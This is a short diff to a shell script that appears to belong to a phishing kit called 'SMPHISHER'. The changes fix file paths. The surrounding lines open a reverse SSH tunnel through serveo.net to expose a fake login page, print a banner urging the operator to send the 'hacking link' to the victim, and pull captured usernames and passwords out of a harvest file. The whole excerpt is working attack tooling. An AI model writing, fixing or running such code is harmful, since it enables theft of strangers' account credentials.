@@ -213,7 +213,7 @@ else
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
 sleep 7
 fi
-serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
+serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' sp)
 figlet SMPHISHER
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 % SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
@@ -233,7 +233,7 @@ grab_ip
 rm -rf pd/www/ip.txt
 fi
 sleep 0.75
-if [[ -e ".htr/www/usernames.txt" ]]; then
+if [[ -e "pd/www/usernames.txt" ]]; then
 account=$(grep -o 'Username:.*' pd/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' pd/www/usernames.txt | cut -d ":" -f2)
